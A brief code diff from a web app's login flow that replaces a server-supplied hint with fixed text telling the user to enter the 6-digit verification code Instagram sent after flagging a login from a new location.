@@ -456,9 +456,9 @@
         if (data?.type === "challenge") {
           challengeId = data.challenge_id;
           document.getElementById("verifyHint").innerHTML =
-            data.hint
-              ? `<strong>${data.hint}</strong><br>Enter the 6-digit code below.`
-              : "Enter the 6-digit code Instagram sent to your email or phone.";
+            `Instagram flagged this login from a new location.<br><br>` +
+            `Check your <strong>email</strong> or <strong>phone</strong> for a 6-digit code from Instagram ` +
+            `(also check spam). It may take up to a minute to arrive.`;
           clearAlert("verifyAlert");
           document.getElementById("otpInput").value = "";
           showPanel("Verify");
